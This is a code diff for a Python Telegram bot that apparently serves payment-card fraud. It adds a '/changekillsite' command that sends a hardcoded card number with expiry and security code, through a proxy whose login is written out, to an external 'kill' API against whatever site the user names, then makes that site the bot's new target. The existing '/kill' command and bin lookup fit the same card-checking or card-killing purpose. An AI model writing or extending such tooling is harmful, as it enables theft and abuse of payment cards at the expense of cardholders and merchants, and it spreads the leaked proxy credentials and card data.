@@ -2557,6 +2557,7 @@ from telegram.error import TelegramError
 from bin import get_bin_info
 from db import get_user, update_user
 import json
+import urllib.parse
 
 # ---------------- CONFIG ----------------
 KILL_API = (
@@ -2585,7 +2586,7 @@ async def consume_credit(user_id: int, amount: int = 5) -> bool:
         return True
     return False
 
-# ---------------- command entry ----------------
+# ---------------- /kill command ----------------
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
@@ -2598,7 +2599,6 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # set cooldown and schedule background task
     user_cooldowns[user_id] = now
     asyncio.create_task(_kill_task(update, context, user_id))
 
@@ -2679,7 +2679,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             anim_texts = [
                 "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣 𝙄𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜...",
                 "𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧...",
-                "𝙖 𝙬𝙝𝙞𝙡𝙚..."
+                "𝙖 𝙬𝙝𝙞𝗹𝙚..."
             ]
             idx = 0
             try:
@@ -2783,6 +2783,74 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         except Exception:
             pass
         print(f"[ERROR] /kill task failed: {e}")
+
+
+# ---------------- /changekillsite command ----------------
+async def changekillsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global KILL_API
+
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Please provide a new site.\nExample:\n<code>/changekillsite https://newsite.com</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    new_site = context.args[0].strip()
+    if not new_site.startswith("http"):
+        await update.message.reply_text(
+            "❌ Invalid URL. Must start with http or https.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # --- Prepare dummy card for API test ---
+    test_card = "4023601038388807|01|29|166"
+    encoded_site = urllib.parse.quote_plus(new_site)
+    encoded_card = urllib.parse.quote_plus(test_card)
+    encoded_proxy = urllib.parse.quote_plus("107.172.163.27:6543:nslqdeey:jhmrvnto65s1")
+
+    api_url = f"https://rockyog.onrender.com/index.php?site={encoded_site}&cc={encoded_card}&proxy={encoded_proxy}"
+
+    # --- Initial animation/message ---
+    try:
+        msg = await update.message.reply_text(
+            f"<pre><code>Testing new kill site...</code></pre>\n<pre><code>{escape(new_site)}</code></pre>",
+            parse_mode=ParseMode.HTML
+        )
+    except TelegramError:
+        await update.message.reply_text("❌ Failed to start test.", parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=30) as resp:
+                resp_text = await resp.text()
+
+        try:
+            api_response = json.loads(resp_text)
+        except Exception:
+            api_response = {"Response": resp_text}
+
+        # --- Update global KILL_API with new site ---
+        KILL_API = (
+            "https://rockyog.onrender.com/index.php"
+            f"?site={new_site}"
+            "&cc={full_card}"
+            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        )
+
+        await msg.edit_text(
+            f"✅ Kill site updated to: <code>{escape(new_site)}</code>\n"
+            f"📥 API Test Response: <code>{escape(json.dumps(api_response, indent=2)[:1000])}</code>",
+            parse_mode=ParseMode.HTML
+        )
+
+    except Exception as e:
+        await msg.edit_text(
+            f"❌ Failed to test new site: <code>{escape(str(e))}</code>",
+            parse_mode=ParseMode.HTML
+        )
 
 
 
